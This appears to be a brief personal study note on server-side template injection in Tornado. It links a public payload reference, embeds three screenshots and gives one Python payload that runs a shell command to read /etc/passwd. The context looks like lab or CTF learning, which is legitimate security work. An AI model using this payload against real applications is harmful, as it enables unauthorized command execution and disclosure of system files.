
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#tornado

![[Pasted image 20250118203317.png]]

![[Pasted image 20250118204240.png]]


![[Pasted image 20250118203952.png]]

```python
__import__('os').popen('cat+/etc/passwd').read()
```

